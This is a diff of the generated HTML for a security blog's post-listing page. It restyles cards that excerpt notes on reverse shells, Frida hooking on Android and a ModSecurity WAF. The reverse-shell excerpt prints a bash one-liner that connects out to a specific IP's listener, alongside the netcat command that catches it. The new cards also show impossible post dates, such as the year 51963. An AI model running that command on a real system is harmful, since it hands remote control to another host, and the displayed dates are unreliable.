@@ -30,217 +30,254 @@
             
                 
                     
-                    &lt;div class=&quot;py-2&quot;&gt;
-    &lt;div class=&quot;row blog-bar-display&quot;&gt;
-        &lt;div class=&quot;Box-header d-flex flex-justify-between&quot;&gt;&lt;!--box header--&gt;
-            &lt;a class=&quot;my-3 col-7 color-fg-default text-bold mb-1 lh-condensed css-truncate-target d-flex&quot; style=&quot;max-width: 100%; font-size: 20px&quot; href=&quot;/blog/2019/shell-reserve-back/&quot;&gt;《「笔记」：反弹shell的几种方法》&lt;/a&gt;
-            &lt;!--article title end--&gt;
-            &lt;a class=&quot;display-nav-li no-underline d-flex&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/blob/main/&quot; target=&quot;_blank&quot;&gt;
-                &lt;span class=&quot;completeness-indicator completeness-indicator-problem&quot;&gt;
-                   &lt;span class=&quot;content-summary-icon scrollbar-20-20&quot;&gt;&lt;/span&gt;
-                &lt;/span&gt;
+                    &lt;div class=&quot;blog-card&quot;&gt;
+    &lt;div class=&quot;blog-card-header&quot;&gt;
+        &lt;a class=&quot;blog-card-title&quot; href=&quot;/blog/2019/shell-reserve-back/&quot;&gt;
+            「笔记」：反弹shell的几种方法
+        &lt;/a&gt;
+        &lt;div class=&quot;blog-card-actions&quot;&gt;
+            &lt;a class=&quot;blog-card-action-btn&quot; href=&quot;/blog/2019/shell-reserve-back/&quot; title=&quot;阅读全文&quot;&gt;
+                &lt;svg viewBox=&quot;0 0 16 16&quot; width=&quot;14&quot; height=&quot;14&quot; fill=&quot;currentColor&quot;&gt;&lt;path d=&quot;M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z&quot;/&gt;&lt;/svg&gt;
             &lt;/a&gt;
-            &lt;!--article relation git repos &lt;branch/md files.&gt; end--&gt;
-        &lt;/div&gt;&lt;!--box header stop--&gt;
-        &lt;div class=&quot;Box-row&quot;&gt;
-            &lt;a class=&quot;d-flex flex-justify-around flex-column overflow-hidden flex-items-stretch&quot; style=&quot;z-index: 2;&quot; href=&quot;/blog/2019/shell-reserve-back/&quot;&gt;&lt;/a&gt;
-            &lt;div class=&quot;discussion-spotlight-details position-relative p-3 pr-5 css-truncate width-fit d-flex flex-column flex-items-start&quot; style=&quot;z-index: 3;&quot;&gt;
-                &lt;a class=&quot;my-3 col-7 color-fg-default text-bold f3 no-underline d-flex flex-items-center mt-2&quot; aria-label=&quot;elisemoe (author)&quot;&gt;
-                    &lt;span class=&quot;mr-1&quot;&gt;记录：关于bash shell的反弹:)随笔记
+            
+            &lt;a class=&quot;blog-card-action-btn&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/edit/main/_posts/blog/2019-12-30-shell-reserve-back.md&quot; target=&quot;_blank&quot; title=&quot;编辑此页&quot;&gt;
+                &lt;svg viewBox=&quot;0 0 16 16&quot; width=&quot;14&quot; height=&quot;14&quot; fill=&quot;currentColor&quot;&gt;&lt;path d=&quot;M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.21.21-.47.364-.756.445l-3.251.93a.75.75 0 0 1-.927-.928l.929-3.25c.081-.286.235-.547.445-.758l8.61-8.61Z&quot;/&gt;&lt;/svg&gt;
+            &lt;/a&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    
+    &lt;div class=&quot;blog-card-body&quot;&gt;
+        &lt;p class=&quot;blog-card-excerpt&quot;&gt;
+            记录：关于bash shell的反弹:)随笔记
 假定环境：
 
 
   kali被攻击机器；ip:192.168.3.32
-  iZj6cgn7odv59wm...&lt;/span&gt;&lt;/a&gt;
-            &lt;/div&gt;
-        &lt;/div&gt;
-        &lt;div class=&quot;Box-row discussion-spotlight-details position-relative py-2 pr-5 css-truncate width-fit d-flex flex-column flex-items-start&quot; style=&quot;z-index: 3;&quot;&gt;
-            &lt;div class=&quot;d-flex nv0 f5 no-underline&quot; style=&quot;font-family: &#39;DM Mono&#39;, monospace;&quot;&gt;
-                &lt;csmall&gt;&lt;div class=&quot;d-flex items-center&quot;&gt;
-                    &lt;a class=&quot;author-avatar-small d-flex px-md-6&quot;&gt;
-                        
+  iZj6cgn7odv59wmjjhe6zwZ攻击机；ip:47.52.233.92
+
+
+1.bash
+root@kali:/# bash -i &amp;gt;&amp;amp;/dev/tcp/47.52.233.92/1234 0&amp;gt;&amp;amp; 1
+
+
+root@iZj6cgn7odv59wmjjhe6zwZ:~# nc -lvvp 1234
+Liste...
+        &lt;/p&gt;
+    &lt;/div&gt;
+    
+
+    &lt;div class=&quot;blog-card-footer&quot;&gt;
+        &lt;div class=&quot;blog-card-meta&quot;&gt;
+            &lt;span class=&quot;blog-card-author&quot;&gt;
+                
 &lt;img alt=&quot;Bin4xin&quot; src=&quot;https://avatars.githubusercontent.com/u/57884471?v=4&quot;/&gt;
-                    &lt;/a&gt;
-                    &lt;!--article author avatar img. end--&gt;
-                    &lt;div class=&quot;color-fg-success-icon scrollbar-16-16&quot;&gt;&lt;/div&gt;&lt;!--article GitHub action success.site.commitString--&gt;
-                    
-                    &lt;a class=&quot;d-flex color-fg-default px-md-6&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/commit/d9452839&quot; target=&quot;_blank&quot;&gt;d9452839&lt;/a&gt;
-                    &lt;!--article author end--&gt;
-
-&lt;!-- site build time set to the latest time.--&gt;
-
-&lt;!-- post time--&gt;
+            &lt;/span&gt;
+            &lt;!--article author end--&gt;
 
 
 
 
 
-&lt;div class=&quot;ml-hide&quot;&gt;
-    &lt;a class=&quot;f2 d-flex color-fg-default&quot; href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;
+
+
+
+&lt;span class=&quot;ymh-author-badge&quot;&gt;
+    &lt;a class=&quot;ymh-author-link&quot; href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;
+        &lt;span class=&quot;ymh-author-avatar&quot;&gt;B&lt;/span&gt;
         Bin4xin
-
-        
-            
-        post
-        
-
-        
-        
-        
-        
-        
-
-        
-            on Dec 30, 2019
-        
     &lt;/a&gt;
-&lt;/div&gt;
-                &lt;/div&gt;&lt;/csmall&gt;
-            &lt;/div&gt;
+
+    
+
+    
+    
+    
+    
+    
+
+    &lt;span class=&quot;ymh-time-badge&quot;&gt;
+        
+            Apr 10, 51963
+        
+    &lt;/span&gt;
+&lt;/span&gt;
+
+        &lt;/div&gt;
+        &lt;div class=&quot;blog-card-meta&quot;&gt;
+            &lt;span class=&quot;blog-card-status-dot&quot;&gt;&lt;/span&gt;
+            
+            &lt;a class=&quot;blog-card-hash&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/commit/8e82aae4&quot; target=&quot;_blank&quot;&gt;
+                8e82aae
+            &lt;/a&gt;
         &lt;/div&gt;
     &lt;/div&gt;
 &lt;/div&gt;
                 
                     
-                    &lt;div class=&quot;py-2&quot;&gt;
-    &lt;div class=&quot;row blog-bar-display&quot;&gt;
-        &lt;div class=&quot;Box-header d-flex flex-justify-between&quot;&gt;&lt;!--box header--&gt;
-            &lt;a class=&quot;my-3 col-7 color-fg-default text-bold mb-1 lh-condensed css-truncate-target d-flex&quot; style=&quot;max-width: 100%; font-size: 20px&quot; href=&quot;/blog/2019/HOOK/BY/FRIDA/&quot;&gt;《「安卓渗透」:HOOK-Frida原理详解》&lt;/a&gt;
-            &lt;!--article title end--&gt;
-            &lt;a class=&quot;display-nav-li no-underline d-flex&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/blob/main/&quot; target=&quot;_blank&quot;&gt;
-                &lt;span class=&quot;completeness-indicator completeness-indicator-problem&quot;&gt;
-                   &lt;span class=&quot;content-summary-icon scrollbar-20-20&quot;&gt;&lt;/span&gt;
-                &lt;/span&gt;
+                    &lt;div class=&quot;blog-card&quot;&gt;
+    &lt;div class=&quot;blog-card-header&quot;&gt;
+        &lt;a class=&quot;blog-card-title&quot; href=&quot;/blog/2019/HOOK/BY/FRIDA/&quot;&gt;
+            「安卓渗透」:HOOK-Frida原理详解
+        &lt;/a&gt;
+        &lt;div class=&quot;blog-card-actions&quot;&gt;
+            &lt;a class=&quot;blog-card-action-btn&quot; href=&quot;/blog/2019/HOOK/BY/FRIDA/&quot; title=&quot;阅读全文&quot;&gt;
+                &lt;svg viewBox=&quot;0 0 16 16&quot; width=&quot;14&quot; height=&quot;14&quot; fill=&quot;currentColor&quot;&gt;&lt;path d=&quot;M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z&quot;/&gt;&lt;/svg&gt;
             &lt;/a&gt;
-            &lt;!--article relation git repos &lt;branch/md files.&gt; end--&gt;
-        &lt;/div&gt;&lt;!--box header stop--&gt;
-        &lt;div class=&quot;Box-row&quot;&gt;
-            &lt;a class=&quot;d-flex flex-justify-around flex-column overflow-hidden flex-items-stretch&quot; style=&quot;z-index: 2;&quot; href=&quot;/blog/2019/HOOK/BY/FRIDA/&quot;&gt;&lt;/a&gt;
-            &lt;div class=&quot;discussion-spotlight-details position-relative p-3 pr-5 css-truncate width-fit d-flex flex-column flex-items-start&quot; style=&quot;z-index: 3;&quot;&gt;
-                &lt;a class=&quot;my-3 col-7 color-fg-default text-bold f3 no-underline d-flex flex-items-center mt-2&quot; aria-label=&quot;elisemoe (author)&quot;&gt;
-                    &lt;span class=&quot;mr-1&quot;&gt;
+            
+            &lt;a class=&quot;blog-card-action-btn&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/edit/main/_posts/blog/2019-12-26-how-hook-android-work.md&quot; target=&quot;_blank&quot; title=&quot;编辑此页&quot;&gt;
+                &lt;svg viewBox=&quot;0 0 16 16&quot; width=&quot;14&quot; height=&quot;14&quot; fill=&quot;currentColor&quot;&gt;&lt;path d=&quot;M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.21.21-.47.364-.756.445l-3.251.93a.75.75 0 0 1-.927-.928l.929-3.25c.081-.286.235-.547.445-.758l8.61-8.61Z&quot;/&gt;&lt;/svg&gt;
+            &lt;/a&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    
+    &lt;div class=&quot;blog-card-body&quot;&gt;
+        &lt;p class=&quot;blog-card-excerpt&quot;&gt;
+            
   在安卓安全测试中，Hook技术是最核心的动态分析手段。本文梳理Hook技术的基本原理，重点介绍Frida框架的使用方式。
 
 
-0x00 Hook技术...&lt;/span&gt;&lt;/a&gt;
-            &lt;/div&gt;
-        &lt;/div&gt;
-        &lt;div class=&quot;Box-row discussion-spotlight-details position-relative py-2 pr-5 css-truncate width-fit d-flex flex-column flex-items-start&quot; style=&quot;z-index: 3;&quot;&gt;
-            &lt;div class=&quot;d-flex nv0 f5 no-underline&quot; style=&quot;font-family: &#39;DM Mono&#39;, monospace;&quot;&gt;
-                &lt;csmall&gt;&lt;div class=&quot;d-flex items-center&quot;&gt;
-                    &lt;a class=&quot;author-avatar-small d-flex px-md-6&quot;&gt;
-                        
+0x00 Hook技术概述
+
+Hook技术是指在Android上进行的跨进程操作，主要分为三个层次：
+
+
+  Native层Hook：针对JNI（Java Native Interface）本地调用的Hook
+  Java层Hook：针对Java方法的Hook
+  框架层Hook：针对Android Framework层的Hook
+
+
+┌─...
+        &lt;/p&gt;
+    &lt;/div&gt;
+    
+
+    &lt;div class=&quot;blog-card-footer&quot;&gt;
+        &lt;div class=&quot;blog-card-meta&quot;&gt;
+            &lt;span class=&quot;blog-card-author&quot;&gt;
+                
 &lt;img alt=&quot;Bin4xin&quot; src=&quot;https://avatars.githubusercontent.com/u/57884471?v=4&quot;/&gt;
-                    &lt;/a&gt;
-                    &lt;!--article author avatar img. end--&gt;
-                    &lt;div class=&quot;color-fg-success-icon scrollbar-16-16&quot;&gt;&lt;/div&gt;&lt;!--article GitHub action success.site.commitString--&gt;
-                    
-                    &lt;a class=&quot;d-flex color-fg-default px-md-6&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/commit/d9452839&quot; target=&quot;_blank&quot;&gt;d9452839&lt;/a&gt;
-                    &lt;!--article author end--&gt;
-
-&lt;!-- site build time set to the latest time.--&gt;
-
-&lt;!-- post time--&gt;
+            &lt;/span&gt;
+            &lt;!--article author end--&gt;
 
 
 
 
 
-&lt;div class=&quot;ml-hide&quot;&gt;
-    &lt;a class=&quot;f2 d-flex color-fg-default&quot; href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;
+
+
+
+&lt;span class=&quot;ymh-author-badge&quot;&gt;
+    &lt;a class=&quot;ymh-author-link&quot; href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;
+        &lt;span class=&quot;ymh-author-avatar&quot;&gt;B&lt;/span&gt;
         Bin4xin
-
-        
-            
-        post
-        
-
-        
-        
-        
-        
-        
-
-        
-            on Dec 26, 2019
-        
     &lt;/a&gt;
-&lt;/div&gt;
-                &lt;/div&gt;&lt;/csmall&gt;
-            &lt;/div&gt;
+
+    
+
+    
+    
+    
+    
+    
+
+    &lt;span class=&quot;ymh-time-badge&quot;&gt;
+        
+            Apr 27, 51952
+        
+    &lt;/span&gt;
+&lt;/span&gt;
+
+        &lt;/div&gt;
+        &lt;div class=&quot;blog-card-meta&quot;&gt;
+            &lt;span class=&quot;blog-card-status-dot&quot;&gt;&lt;/span&gt;
+            
+            &lt;a class=&quot;blog-card-hash&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/commit/8e82aae4&quot; target=&quot;_blank&quot;&gt;
+                8e82aae
+            &lt;/a&gt;
         &lt;/div&gt;
     &lt;/div&gt;
 &lt;/div&gt;
                 
                     
-                    &lt;div class=&quot;py-2&quot;&gt;
-    &lt;div class=&quot;row blog-bar-display&quot;&gt;
-        &lt;div class=&quot;Box-header d-flex flex-justify-between&quot;&gt;&lt;!--box header--&gt;
-            &lt;a class=&quot;my-3 col-7 color-fg-default text-bold mb-1 lh-condensed css-truncate-target d-flex&quot; style=&quot;max-width: 100%; font-size: 20px&quot; href=&quot;/blog/2019/modsec-test/&quot;&gt;《Mod-Security：有关「WAF」的爱恨情仇》&lt;/a&gt;
-            &lt;!--article title end--&gt;
-            &lt;a class=&quot;display-nav-li no-underline d-flex&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/blob/main/&quot; target=&quot;_blank&quot;&gt;
-                &lt;span class=&quot;completeness-indicator completeness-indicator-problem&quot;&gt;
-                   &lt;span class=&quot;content-summary-icon scrollbar-20-20&quot;&gt;&lt;/span&gt;
-                &lt;/span&gt;
+                    &lt;div class=&quot;blog-card&quot;&gt;
+    &lt;div class=&quot;blog-card-header&quot;&gt;
+        &lt;a class=&quot;blog-card-title&quot; href=&quot;/blog/2019/modsec-test/&quot;&gt;
+            Mod-Security：有关「WAF」的爱恨情仇
+        &lt;/a&gt;
+        &lt;div class=&quot;blog-card-actions&quot;&gt;
+            &lt;a class=&quot;blog-card-action-btn&quot; href=&quot;/blog/2019/modsec-test/&quot; title=&quot;阅读全文&quot;&gt;
+                &lt;svg viewBox=&quot;0 0 16 16&quot; width=&quot;14&quot; height=&quot;14&quot; fill=&quot;currentColor&quot;&gt;&lt;path d=&quot;M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z&quot;/&gt;&lt;/svg&gt;
             &lt;/a&gt;
-            &lt;!--article relation git repos &lt;branch/md files.&gt; end--&gt;
-        &lt;/div&gt;&lt;!--box header stop--&gt;
-        &lt;div class=&quot;Box-row&quot;&gt;
-            &lt;a class=&quot;d-flex flex-justify-around flex-column overflow-hidden flex-items-stretch&quot; style=&quot;z-index: 2;&quot; href=&quot;/blog/2019/modsec-test/&quot;&gt;&lt;/a&gt;
-            &lt;div class=&quot;discussion-spotlight-details position-relative p-3 pr-5 css-truncate width-fit d-flex flex-column flex-items-start&quot; style=&quot;z-index: 3;&quot;&gt;
-                &lt;a class=&quot;my-3 col-7 color-fg-default text-bold f3 no-underline d-flex flex-items-center mt-2&quot; aria-label=&quot;elisemoe (author)&quot;&gt;
-                    &lt;span class=&quot;mr-1&quot;&gt;添加于2021/02/05
+            
+            &lt;a class=&quot;blog-card-action-btn&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/edit/main/_posts/blog/2019-12-25-modsec-test.md&quot; target=&quot;_blank&quot; title=&quot;编辑此页&quot;&gt;
+                &lt;svg viewBox=&quot;0 0 16 16&quot; width=&quot;14&quot; height=&quot;14&quot; fill=&quot;currentColor&quot;&gt;&lt;path d=&quot;M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.21.21-.47.364-.756.445l-3.251.93a.75.75 0 0 1-.927-.928l.929-3.25c.081-.286.235-.547.445-.758l8.61-8.61Z&quot;/&gt;&lt;/svg&gt;
+            &lt;/a&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    
+    &lt;div class=&quot;blog-card-body&quot;&gt;
+        &lt;p class=&quot;blog-card-excerpt&quot;&gt;
+            添加于2021/02/05
 
 “朝花夕拾”
 
-这篇与WAF相关《技 术》博客其实没有多少技术含量，只是当时刚刚接触到WAF，感觉非常的新鲜然后有了这篇博客...&lt;/span&gt;&lt;/a&gt;
-            &lt;/div&gt;
-        &lt;/div&gt;
-        &lt;div class=&quot;Box-row discussion-spotlight-details position-relative py-2 pr-5 css-truncate width-fit d-flex flex-column flex-items-start&quot; style=&quot;z-index: 3;&quot;&gt;
-            &lt;div class=&quot;d-flex nv0 f5 no-underline&quot; style=&quot;font-family: &#39;DM Mono&#39;, monospace;&quot;&gt;
-                &lt;csmall&gt;&lt;div class=&quot;d-flex items-center&quot;&gt;
-                    &lt;a class=&quot;author-avatar-small d-flex px-md-6&quot;&gt;
-                        
+这篇与WAF相关《技 术》博客其实没有多少技术含量，只是当时刚刚接触到WAF，感觉非常的新鲜然后有了这篇博客，其实当时连LINUX基础常识都还不是非常的了解，
+年少轻狂的来配置WAF肯定无法成功；现在回头来看当时的文笔还是较为稚嫩，通篇都是一些”转述”的代码块，没有自己的相关思想，是很糟糕的一篇博客。
+
+刚好年底总结博客，总结到WAF这一块，正好把这一篇的文章给补上，整理文章可以查看，较于下面这篇文章，主要增加了自定义规则库...
+        &lt;/p&gt;
+    &lt;/div&gt;
+    
+
+    &lt;div class=&quot;blog-card-footer&quot;&gt;
+        &lt;div class=&quot;blog-card-meta&quot;&gt;
+            &lt;span class=&quot;blog-card-author&quot;&gt;
+                
 &lt;img alt=&quot;Bin4xin&quot; src=&quot;https://avatars.githubusercontent.com/u/57884471?v=4&quot;/&gt;
-                    &lt;/a&gt;
-                    &lt;!--article author avatar img. end--&gt;
-                    &lt;div class=&quot;color-fg-success-icon scrollbar-16-16&quot;&gt;&lt;/div&gt;&lt;!--article GitHub action success.site.commitString--&gt;
-                    
-                    &lt;a class=&quot;d-flex color-fg-default px-md-6&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/commit/d9452839&quot; target=&quot;_blank&quot;&gt;d9452839&lt;/a&gt;
-                    &lt;!--article author end--&gt;
-
-&lt;!-- site build time set to the latest time.--&gt;
-
-&lt;!-- post time--&gt;
+            &lt;/span&gt;
+            &lt;!--article author end--&gt;
 
 
 
 
 
-&lt;div class=&quot;ml-hide&quot;&gt;
-    &lt;a class=&quot;f2 d-flex color-fg-default&quot; href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;
+
+
+
+&lt;span class=&quot;ymh-author-badge&quot;&gt;
+    &lt;a class=&quot;ymh-author-link&quot; href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;
+        &lt;span class=&quot;ymh-author-avatar&quot;&gt;B&lt;/span&gt;
         Bin4xin
-
-        
-            
-            &lt;!-- wrench time--&gt;
-            
-        edited
-        
-
-        
-        
-        
-        
-        
-
-        
-            on Oct 20, 2022
-        
     &lt;/a&gt;
-&lt;/div&gt;
-                &lt;/div&gt;&lt;/csmall&gt;
-            &lt;/div&gt;
+
+    
+
+    
+    
+    
+    
+    
+
+    &lt;span class=&quot;ymh-time-badge&quot;&gt;
+        
+            Aug 1, 51949
+        
+    &lt;/span&gt;
+&lt;/span&gt;
+
+        &lt;/div&gt;
+        &lt;div class=&quot;blog-card-meta&quot;&gt;
+            &lt;span class=&quot;blog-card-status-dot&quot;&gt;&lt;/span&gt;
+            
+            &lt;a class=&quot;blog-card-hash&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/commit/8e82aae4&quot; target=&quot;_blank&quot;&gt;
+                8e82aae
+            &lt;/a&gt;
         &lt;/div&gt;
     &lt;/div&gt;
 &lt;/div&gt;
@@ -411,7 +448,7 @@
     &lt;/div&gt;
     
     &lt;p&gt;
-    &lt;details open&gt;
+    &lt;details&gt;
         &lt;summary class=&quot;point flex justify-between&quot;&gt;所有标签/数量&lt;/summary&gt;
         
         &lt;p&gt;
@@ -837,217 +874,254 @@
             
                 
                     
-                    <div class="py-2">
-    <div class="row blog-bar-display">
-        <div class="Box-header d-flex flex-justify-between"><!--box header-->
-            <a class="my-3 col-7 color-fg-default text-bold mb-1 lh-condensed css-truncate-target d-flex" style="max-width: 100%; font-size: 20px" href="/blog/2019/shell-reserve-back/">《「笔记」：反弹shell的几种方法》</a>
-            <!--article title end-->
-            <a class="display-nav-li no-underline d-flex" href="https://github.com/Bin4xin/bin4xin.github.io/blob/main/" target="_blank">
-                <span class="completeness-indicator completeness-indicator-problem">
-                   <span class="content-summary-icon scrollbar-20-20"></span>
-                </span>
+                    <div class="blog-card">
+    <div class="blog-card-header">
+        <a class="blog-card-title" href="/blog/2019/shell-reserve-back/">
+            「笔记」：反弹shell的几种方法
+        </a>
+        <div class="blog-card-actions">
+            <a class="blog-card-action-btn" href="/blog/2019/shell-reserve-back/" title="阅读全文">
+                <svg viewBox="0 0 16 16" width="14" height="14" fill="currentColor"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"/></svg>
             </a>
-            <!--article relation git repos <branch/md files.> end-->
-        </div><!--box header stop-->
-        <div class="Box-row">
-            <a class="d-flex flex-justify-around flex-column overflow-hidden flex-items-stretch" style="z-index: 2;" href="/blog/2019/shell-reserve-back/"></a>
-            <div class="discussion-spotlight-details position-relative p-3 pr-5 css-truncate width-fit d-flex flex-column flex-items-start" style="z-index: 3;">
-                <a class="my-3 col-7 color-fg-default text-bold f3 no-underline d-flex flex-items-center mt-2" aria-label="elisemoe (author)">
-                    <span class="mr-1">记录：关于bash shell的反弹:)随笔记
+            
+            <a class="blog-card-action-btn" href="https://github.com/Bin4xin/bin4xin.github.io/edit/main/_posts/blog/2019-12-30-shell-reserve-back.md" target="_blank" title="编辑此页">
+                <svg viewBox="0 0 16 16" width="14" height="14" fill="currentColor"><path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.21.21-.47.364-.756.445l-3.251.93a.75.75 0 0 1-.927-.928l.929-3.25c.081-.286.235-.547.445-.758l8.61-8.61Z"/></svg>
+            </a>
+            
+        </div>
+    </div>
+
+    
+    <div class="blog-card-body">
+        <p class="blog-card-excerpt">
+            记录：关于bash shell的反弹:)随笔记
 假定环境：
 
 
   kali被攻击机器；ip:192.168.3.32
-  iZj6cgn7odv59wm...</span></a>
-            </div>
-        </div>
-        <div class="Box-row discussion-spotlight-details position-relative py-2 pr-5 css-truncate width-fit d-flex flex-column flex-items-start" style="z-index: 3;">
-            <div class="d-flex nv0 f5 no-underline" style="font-family: 'DM Mono', monospace;">
-                <csmall><div class="d-flex items-center">
-                    <a class="author-avatar-small d-flex px-md-6">
-                        
+  iZj6cgn7odv59wmjjhe6zwZ攻击机；ip:47.52.233.92
+
+
+1.bash
+root@kali:/# bash -i &gt;&amp;/dev/tcp/47.52.233.92/1234 0&gt;&amp; 1
+
+
+root@iZj6cgn7odv59wmjjhe6zwZ:~# nc -lvvp 1234
+Liste...
+        </p>
+    </div>
+    
+
+    <div class="blog-card-footer">
+        <div class="blog-card-meta">
+            <span class="blog-card-author">
+                
 <img alt="Bin4xin" src="https://avatars.githubusercontent.com/u/57884471?v=4"/>
-                    </a>
-                    <!--article author avatar img. end-->
-                    <div class="color-fg-success-icon scrollbar-16-16"></div><!--article GitHub action success.site.commitString-->
-                    
-                    <a class="d-flex color-fg-default px-md-6" href="https://github.com/Bin4xin/bin4xin.github.io/commit/d9452839" target="_blank">d9452839</a>
-                    <!--article author end-->
-
-<!-- site build time set to the latest time.-->
-
-<!-- post time-->
+            </span>
+            <!--article author end-->
 
 
 
 
 
-<div class="ml-hide">
-    <a class="f2 d-flex color-fg-default" href="https://github.com/Bin4xin" target="_blank">
+
+
+
+<span class="ymh-author-badge">
+    <a class="ymh-author-link" href="https://github.com/Bin4xin" target="_blank">
+        <span class="ymh-author-avatar">B</span>
         Bin4xin
-
-        
-            
-        post
-        
-
-        
-        
-        
-        
-        
-
-        
-            on Dec 30, 2019
-        
     </a>
-</div>
-                </div></csmall>
-            </div>
+
+    
+
+    
+    
+    
+    
+    
+
+    <span class="ymh-time-badge">
+        
+            Apr 10, 51963
+        
+    </span>
+</span>
+
+        </div>
+        <div class="blog-card-meta">
+            <span class="blog-card-status-dot"></span>
+            
+            <a class="blog-card-hash" href="https://github.com/Bin4xin/bin4xin.github.io/commit/8e82aae4" target="_blank">
+                8e82aae
+            </a>
         </div>
     </div>
 </div>
                 
                     
-                    <div class="py-2">
-    <div class="row blog-bar-display">
-        <div class="Box-header d-flex flex-justify-between"><!--box header-->
-            <a class="my-3 col-7 color-fg-default text-bold mb-1 lh-condensed css-truncate-target d-flex" style="max-width: 100%; font-size: 20px" href="/blog/2019/HOOK/BY/FRIDA/">《「安卓渗透」:HOOK-Frida原理详解》</a>
-            <!--article title end-->
-            <a class="display-nav-li no-underline d-flex" href="https://github.com/Bin4xin/bin4xin.github.io/blob/main/" target="_blank">
-                <span class="completeness-indicator completeness-indicator-problem">
-                   <span class="content-summary-icon scrollbar-20-20"></span>
-                </span>
+                    <div class="blog-card">
+    <div class="blog-card-header">
+        <a class="blog-card-title" href="/blog/2019/HOOK/BY/FRIDA/">
+            「安卓渗透」:HOOK-Frida原理详解
+        </a>
+        <div class="blog-card-actions">
+            <a class="blog-card-action-btn" href="/blog/2019/HOOK/BY/FRIDA/" title="阅读全文">
+                <svg viewBox="0 0 16 16" width="14" height="14" fill="currentColor"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"/></svg>
             </a>
-            <!--article relation git repos <branch/md files.> end-->
-        </div><!--box header stop-->
-        <div class="Box-row">
-            <a class="d-flex flex-justify-around flex-column overflow-hidden flex-items-stretch" style="z-index: 2;" href="/blog/2019/HOOK/BY/FRIDA/"></a>
-            <div class="discussion-spotlight-details position-relative p-3 pr-5 css-truncate width-fit d-flex flex-column flex-items-start" style="z-index: 3;">
-                <a class="my-3 col-7 color-fg-default text-bold f3 no-underline d-flex flex-items-center mt-2" aria-label="elisemoe (author)">
-                    <span class="mr-1">
+            
+            <a class="blog-card-action-btn" href="https://github.com/Bin4xin/bin4xin.github.io/edit/main/_posts/blog/2019-12-26-how-hook-android-work.md" target="_blank" title="编辑此页">
+                <svg viewBox="0 0 16 16" width="14" height="14" fill="currentColor"><path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.21.21-.47.364-.756.445l-3.251.93a.75.75 0 0 1-.927-.928l.929-3.25c.081-.286.235-.547.445-.758l8.61-8.61Z"/></svg>
+            </a>
+            
+        </div>
+    </div>
+
+    
+    <div class="blog-card-body">
+        <p class="blog-card-excerpt">
+            
   在安卓安全测试中，Hook技术是最核心的动态分析手段。本文梳理Hook技术的基本原理，重点介绍Frida框架的使用方式。
 
 
-0x00 Hook技术...</span></a>
-            </div>
-        </div>
-        <div class="Box-row discussion-spotlight-details position-relative py-2 pr-5 css-truncate width-fit d-flex flex-column flex-items-start" style="z-index: 3;">
-            <div class="d-flex nv0 f5 no-underline" style="font-family: 'DM Mono', monospace;">
-                <csmall><div class="d-flex items-center">
-                    <a class="author-avatar-small d-flex px-md-6">
-                        
+0x00 Hook技术概述
+
+Hook技术是指在Android上进行的跨进程操作，主要分为三个层次：
+
+
+  Native层Hook：针对JNI（Java Native Interface）本地调用的Hook
+  Java层Hook：针对Java方法的Hook
+  框架层Hook：针对Android Framework层的Hook
+
+
+┌─...
+        </p>
+    </div>
+    
+
+    <div class="blog-card-footer">
+        <div class="blog-card-meta">
+            <span class="blog-card-author">
+                
 <img alt="Bin4xin" src="https://avatars.githubusercontent.com/u/57884471?v=4"/>
-                    </a>
-                    <!--article author avatar img. end-->
